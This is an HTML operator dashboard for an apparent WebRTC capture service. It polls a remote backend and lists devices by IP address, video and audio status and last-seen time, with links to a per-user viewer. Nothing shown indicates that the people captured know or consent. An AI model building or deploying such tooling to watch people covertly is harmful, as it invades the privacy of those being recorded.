<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <link rel="stylesheet" href="./style.css" />
  <title>Dashboard</title>
</head>
<body>
  <div class="container">
    <div class="header">
      <h2>Dashboard</h2>
      <div class="row">
        <button id="refresh" class="btn">Refresh</button>
        <span class="badge">Open capture on device: /view/capture.html</span>
      </div>
    </div>

    <div class="card">
      <table class="table" id="table">
        <thead><tr><th>#</th><th>IP</th><th>Status</th><th>Video</th><th>Audio</th><th>Last Seen</th><th>Action</th></tr></thead>
        <tbody></tbody>
      </table>
      <div class="small" style="margin-top:8px;">Users are assigned: user-1, user-2, ...</div>
    </div>
  </div>

  <script type="module">
    import { qs, el, fmtTs } from './utils.js';
    window.BACKEND = window.BACKEND || 'https://webrtc-capture.onrender.com';

    async function load(){
      const r = await fetch(`${window.BACKEND}/api/users`);
      if (!r.ok) { console.warn('Users fetch failed'); return; }
      const j = await r.json();
      const tb = qs('#table tbody'); tb.innerHTML = '';
      (j.users || []).forEach(u=>{
        const tr = document.createElement('tr');
        tr.append(el('td',{}, u.id));
        tr.append(el('td',{}, u.ip || '—'));
        tr.append(el('td',{}, u.status || '—'));
        tr.append(el('td',{}, u.hasVideo ? 'on' : 'off'));
        tr.append(el('td',{}, u.hasAudio ? 'on' : 'off'));
        tr.append(el('td',{}, fmtTs(u.lastSeen || u.createdAt || Date.now())));
        const a = el('a',{ href:`./view.html?userId=${u.id}` }, 'Open');
        tr.append(el('td',{}, a));
        tb.append(tr);
      });
    }

    qs('#refresh').addEventListener('click', load);
    load();
    setInterval(load, 5000);
  </script>
</body>
</html>
